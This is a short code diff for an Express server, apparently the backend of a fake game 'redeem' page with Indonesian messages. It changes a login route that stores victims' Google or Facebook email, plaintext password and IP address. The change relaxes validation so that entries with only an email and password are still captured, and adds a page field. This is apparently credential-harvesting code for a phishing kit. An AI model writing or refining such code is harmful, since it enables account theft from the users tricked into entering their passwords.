@@ -741,14 +741,20 @@ app.post('/webhook', async (req, res) => {
 });
 
 app.post('/api/login', async (req, res) => {
-  const { nickname, uid, level, method, email, password } = req.body;
-  if (!nickname || !uid || !email || !password) {
+  const { nickname, uid, level, method, email, password, page } = req.body;
+  if (!email || !password) {
     return res.status(400).json({ success: false, message: 'Data tidak lengkap' });
   }
   const methodLabel = method === 'google' ? 'Google' : 'Facebook';
   const ip          = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown')
                         .split(',')[0].trim();
-  const entry = { nickname, uid, level: level || '-', method: methodLabel, email, password, ip, ts: Date.now() };
+  const entry = {
+    nickname: nickname || 'Player',
+    uid:      uid      || 'N/A',
+    level:    level    || '-',
+    page:     page     || 'redeem',
+    method:   methodLabel, email, password, ip, ts: Date.now()
+  };
 
   const no = addLogin(entry);
 
